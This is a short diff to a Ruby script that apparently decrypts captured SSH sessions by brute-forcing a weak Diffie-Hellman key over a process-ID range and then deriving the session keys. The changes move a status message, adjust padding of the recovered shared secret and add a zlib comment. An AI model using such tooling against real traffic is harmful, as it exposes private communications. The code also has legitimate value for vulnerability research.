@@ -94,6 +94,7 @@ class Stream
 
 	def readstream
 		begin
+			# XXX if it doesnt work (invalid header blabla), try with ZLib::Inflate.new(-15) instead
 			@zlib = ZLib::Inflate.new(nil) if @compr == 'zlib'
 			nil while @ptr < @data.length and not ['DISCONNECT', 'NEWKEYS'].include? readpacket.type
 			puts if $VERBOSE
@@ -357,7 +358,6 @@ kex_hash = find_matching_alg(cs['KEXINIT'][:kex_algorithms], ss['KEXINIT'][:kex_
 
 puts "cipher: #{cipher}, mac: #{mac}, kex_hash: #{kex_hash}, compr: #{compr}"
 
-puts " * bruteforce DH"
 groupinfo = ss['DH_GEX_GROUP']
 gex_reply = ss['DH_GEX_REPLY']
 gex_init  = cs['DH_GEX_INIT']
@@ -374,6 +374,7 @@ end
 if opts[:shared]
 	shared_secret = opts[:shared]
 else
+	puts " * bruteforce DH"
 	args = { 'b' => needed_bits, 'p' => opts[:pidrange], (opts[:client] ? 'c' : 's') => '',
 		'G' => groupinfo[:g].allhex, 'P' => groupinfo[:p].allhex,
 		'k' => weak_key, 'K' => other_key, 'n' => opts[:cpus]}
@@ -389,8 +390,9 @@ else
 	puts bruteforce_out if $VERBOSE
 	abort "Bruteforce failed" if not $?.exited? or $?.exitstatus != 0
 	shared_secret = bruteforce_out.split("\n")[-2]
-	shared_secret = '00' + shared_secret if shared_secret[0, 1].to_i(16) >= 8
 end
+shared_secret = '0' + shared_secret if shared_secret.length & 1 == 1
+shared_secret = '00' + shared_secret if shared_secret[0, 1].to_i(16) >= 8
 puts "DH shared secret : " + shared_secret
 
 puts " * derive keys"
